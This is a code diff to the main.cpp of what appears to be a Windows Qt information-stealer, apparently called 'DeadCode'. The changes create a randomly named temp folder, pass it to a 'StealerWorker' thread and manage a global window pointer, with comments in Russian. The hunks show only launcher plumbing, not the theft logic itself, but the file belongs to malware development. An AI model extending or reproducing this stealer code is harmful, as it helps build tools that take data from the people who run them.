@@ -5,6 +5,8 @@
 #include <gdiplus.h>
 #include <QApplication>
 #include <QThread>
+#include <QDir>
+#include <QString>
 
 #include "mainwindow.h"
 #include "ui_mainwindow.h"
@@ -32,7 +34,7 @@ typedef struct _THREAD_BASIC_INFORMATION {
 
 // Глобальные переменные
 std::mutex g_mutex;
-MainWindow* g_mainWindow = nullptr; // Единственное определение здесь
+MainWindow* g_mainWindow = nullptr; // Возвращена
 Gdiplus::GdiplusStartupInput gdiplusStartupInput;
 ULONG_PTR gdiplusToken;
 
@@ -46,15 +48,19 @@ int main(int argc, char *argv[]) {
 
     // Инициализация QApplication
     QApplication app(argc, argv);
-    QCoreApplication::setAttribute(Qt::AA_EnableHighDpiScaling);
 
     // Создание главного окна
     MainWindow w;
+    g_mainWindow = &w; // Установка указателя
     w.show();
 
     // Создание временной директории для StealerWorker
-    std::string tempDir = std::string(getenv("TEMP") ? getenv("TEMP") : "C:\\Temp") + 
-                         "\\DeadCode_" + w.generateRandomString(8);
+    QString tempDir = QString::fromStdString(std::string(getenv("TEMP") ? getenv("TEMP") : "C:\\Temp")) +
+                      "\\DeadCode_" + w.generateRandomString(8);
+    QDir dir;
+    if (!dir.exists(tempDir)) {
+        dir.mkpath(tempDir);
+    }
 
     // Настройка StealerWorker в отдельном потоке
     StealerWorker* worker = new StealerWorker(&w, tempDir);
@@ -76,7 +82,8 @@ int main(int argc, char *argv[]) {
     // Запуск главного цикла приложения
     int result = app.exec();
 
-    // Очистка GDI+
+    // Очистка
+    g_mainWindow = nullptr; // Сброс указателя
     Gdiplus::GdiplusShutdown(gdiplusToken);
 
     return result;
